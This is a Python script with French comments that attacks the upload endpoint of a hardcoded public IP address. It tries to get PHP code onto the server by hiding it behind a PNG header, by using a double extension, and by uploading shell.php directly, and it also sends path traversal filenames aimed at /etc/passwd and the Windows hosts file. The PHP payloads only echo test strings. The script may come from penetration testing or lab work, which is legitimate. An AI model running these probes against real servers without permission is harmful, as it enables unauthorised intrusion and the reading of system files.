#!/usr/bin/env python3
import requests
import os
from pathlib import Path

# Configuration
BASE_URL = "http://54.174.169.185:3000"
UPLOAD_URL = f"{BASE_URL}/upload"

def test_file_upload():
    """Test de la vulnérabilité de téléchargement de fichiers"""
    
    print("🔍 Test de vulnérabilité de téléchargement de fichiers")
    print("=" * 50)
    
    # Test 1: Fichier PNG normal
    print("\n📁 Test 1: Fichier PNG normal")
    test_png_upload()
    
    # Test 2: Fichier avec extension PNG mais contenu PHP
    print("\n🐛 Test 2: Fichier PNG avec contenu PHP")
    test_php_in_png()
    
    # Test 3: Fichier avec double extension
    print("\n🔧 Test 3: Fichier avec double extension")
    test_double_extension()
    
    # Test 4: Fichier avec extension PHP
    print("\n⚡ Test 4: Fichier PHP direct")
    test_php_upload()

def test_png_upload():
    """Test avec un fichier PNG normal"""
    try:
        # Créer un fichier PNG simple
        png_content = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\tpHYs\x00\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18\x00\x00\x00\x07tIME\x07\xe5\x08\x19\x0e\x1c\x0c\xc8\xc8\xc8\xc8\x00\x00\x00\x0cIDATx\x9cc```\x00\x00\x00\x04\x00\x01\xf6\x178\xea\x00\x00\x00\x00IEND\xaeB`\x82'
        
        files = {'file': ('test.png', png_content, 'image/png')}
        response = requests.post(UPLOAD_URL, files=files)
        
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text[:200]}...")
        
        if response.status_code == 200:
            print("✅ Fichier PNG accepté")
        else:
            print("❌ Fichier PNG rejeté")
            
    except Exception as e:
        print(f"❌ Erreur: {e}")

def test_php_in_png():
    """Test avec un fichier PNG contenant du code PHP"""
    try:
        # Créer un fichier PNG avec du code PHP caché
        php_code = b'<?php echo "PHP Execution Test"; ?>'
        png_header = b'\x89PNG\r\n\x1a\n'
        
        # Combiner l'en-tête PNG avec le code PHP
        malicious_content = png_header + php_code
        
        files = {'file': ('shell.png', malicious_content, 'image/png')}
        response = requests.post(UPLOAD_URL, files=files)
        
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text[:200]}...")
        
        if response.status_code == 200:
            print("✅ Fichier PNG malveillant accepté")
        else:
            print("❌ Fichier PNG malveillant rejeté")
            
    except Exception as e:
        print(f"❌ Erreur: {e}")

def test_double_extension():
    """Test avec un fichier ayant une double extension"""
    try:
        php_code = b'<?php echo "Double Extension Test"; ?>'
        
        files = {'file': ('test.png.php', php_code, 'image/png')}
        response = requests.post(UPLOAD_URL, files=files)
        
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text[:200]}...")
        
        if response.status_code == 200:
            print("✅ Fichier avec double extension accepté")
        else:
            print("❌ Fichier avec double extension rejeté")
            
    except Exception as e:
        print(f"❌ Erreur: {e}")

def test_php_upload():
    """Test direct avec un fichier PHP"""
    try:
        php_code = b'<?php echo "Direct PHP Upload Test"; ?>'
        
        files = {'file': ('shell.php', php_code, 'application/x-php')}
        response = requests.post(UPLOAD_URL, files=files)
        
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text[:200]}...")
        
        if response.status_code == 200:
            print("✅ Fichier PHP direct accepté")
        else:
            print("❌ Fichier PHP direct rejeté")
            
    except Exception as e:
        print(f"❌ Erreur: {e}")

def test_path_traversal():
    """Test de path traversal dans le nom de fichier"""
    print("\n🔍 Test 5: Path Traversal")
    print("=" * 30)
    
    traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd"
    ]
    
    png_content = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\tpHYs\x00\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18\x00\x00\x00\x07tIME\x07\xe5\x08\x19\x0e\x1c\x0c\xc8\xc8\xc8\xc8\x00\x00\x00\x0cIDATx\x9cc```\x00\x00\x00\x04\x00\x01\xf6\x178\xea\x00\x00\x00\x00IEND\xaeB`\x82'
    
    for payload in traversal_payloads:
        try:
            filename = f"{payload}.png"
            files = {'file': (filename, png_content, 'image/png')}
            response = requests.post(UPLOAD_URL, files=files)
            
            print(f"Payload: {payload}")
            print(f"Status: {response.status_code}")
            print(f"Response: {response.text[:100]}...")
            print("-" * 30)
            
        except Exception as e:
            print(f"❌ Erreur avec {payload}: {e}")

if __name__ == "__main__":
    test_file_upload()
    test_path_traversal()
